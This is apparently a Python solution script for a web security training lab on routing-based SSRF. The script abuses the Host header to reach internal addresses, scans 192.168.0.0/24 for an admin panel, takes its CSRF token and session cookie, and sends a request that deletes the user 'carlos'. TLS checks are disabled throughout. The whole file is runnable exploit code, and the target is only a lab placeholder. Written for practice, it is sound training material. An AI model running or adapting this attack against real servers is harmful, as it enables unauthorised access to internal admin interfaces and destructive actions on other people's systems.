import http.client
import ipaddress
import re
import ssl
import urllib.parse

LAB_ID = "???"
COLLABORATOR_URL = "???"


def GET(
        path: str,
        _lab: str | None = None,
        session: str | None = None,
        _host: str | None = None,
) -> http.client.HTTPResponse:
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    method, path = 'GET', f'https://{host}{path}'
    headers = {}
    cookies = []
    if _lab:
        cookies.append(f'_lab={_lab}')
    if session:
        cookies.append(f'session={session}')
    if cookies:
        headers['cookie'] = "; ".join(cookies)
    if _host:
        headers['host'] = _host
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, '', headers)
    return connection.getresponse()


def POST_delete(
        _lab: str,
        session: str,
        _host: str,
        csrf: str,
) -> http.client.HTTPResponse:
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    method, path = 'POST', f'https://{host}/admin/delete'
    headers = {
        'content-type': 'application/x-www-form-urlencoded',
    }
    cookies = []
    if _lab:
        cookies.append(f'_lab={_lab}')
    if session:
        cookies.append(f'session={session}')
    if cookies:
        headers['cookie'] = "; ".join(cookies)
    if _host:
        headers['host'] = _host
    fields = {
        'csrf': csrf,
        'username': 'carlos',
    }
    body = urllib.parse.urlencode(fields)
    headers['content-length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def extract_csrf(body: str) -> str:
    return re.findall(r'name="csrf" value="([a-zA-Z0-9]+)"', body)[0]


def extract_session(response: http.client.HTTPResponse) -> str:
    cookie_header = response.getheader('set-cookie')
    return re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]


def extract_lab(response: http.client.HTTPResponse) -> str:
    cookie_header = response.getheader('set-cookie')
    return re.findall(r'_lab=([%a-zA-Z0-9]+);', cookie_header)[0]


def lab_cookies() -> tuple[str, str]:
    response = GET(path="/")
    return extract_lab(response), extract_session(response)


_lab, session = lab_cookies()
print(f"_lab: {_lab}")
print(f"session: {session}")
response = GET(path="/", _host=COLLABORATOR_URL, _lab=_lab, session=session)
print(response.status)
for name, header in response.headers.items():
    print(f"{name}: {header}")
response_body = response.read().decode()
print(response_body)
if response.status != 200 or not response.headers['server'] or 'collaborator' not in response.headers['server']:
    print("host header authentication not confirmed")
    exit(1)
print("host header authentication confirmed")
print()

admin_ip = None
for ip in ipaddress.ip_network('192.168.0.0/24').hosts():
    print(f"trying admin server internal ip: {ip}")
    response = GET(path="/admin", _host=str(ip), _lab=_lab)
    if response.status == 200:
        admin_ip = str(ip)
        break
else:
    print("failed to find internal server ip for ssrf")
    exit(1)

print(f"found admin panel server internal ip: {admin_ip}")
print(response.status)
for name, header in response.headers.items():
    print(f"{name}: {header}")
response_body = response.read().decode()
print(response_body)
print()

print("deleting user carlos")
csrf = extract_csrf(response_body)
session = extract_session(response)
print(f"csrf: {csrf}")
print(f"session: {session}")
response = POST_delete(session=session, _lab=_lab, _host=admin_ip, csrf=csrf)
print(response.status)
for name, header in response.headers.items():
    print(f"{name}: {header}")
response_body = response.read().decode()
print(response_body)
